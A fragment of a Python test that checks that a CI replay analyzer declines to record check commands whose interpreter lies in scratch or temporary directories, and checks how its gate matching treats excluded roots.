    hostile["environment"] = {"TMPDIR": "/Users/ada/scratch", "FORESIGHT_TEST_TEMP_ROOT": "/mnt/ci-temp/"}
    hostile["checks"][1].update(id="shared-guards", entrypoint=["/Users/ada/scratch/venv/bin/python", "-m", "tools.check_local_validation"])
    [failed] = replay.analyze(hostile, HERE)["failing_checks"]
    assert failed["command"] is None and failed["command_status"].startswith("unrecorded")
    hostile["checks"][1]["entrypoint"] = ["/mnt/ci-temp/bin/python", "-m", "tools.check_local_validation"]
    assert replay.analyze(hostile, HERE)["failing_checks"][0]["command"] is None
    hostile["checks"][1]["entrypoint"] = ["/Users/ada/repo/.venv/bin/python", "-m", "tools.check_local_validation"]
    assert replay.analyze(hostile, HERE)["failing_checks"][0]["command"] is not None
    assert replay.matches_gate(["/r/t/python", "-m", "tools.check_local_validation"], GATE, ["/r/t/"]) is False
    assert replay.matches_gate(["/r/t/python", "-m", "tools.check_local_validation"], GATE, ["/", ""]) is True  # a root of "/" excludes nothing
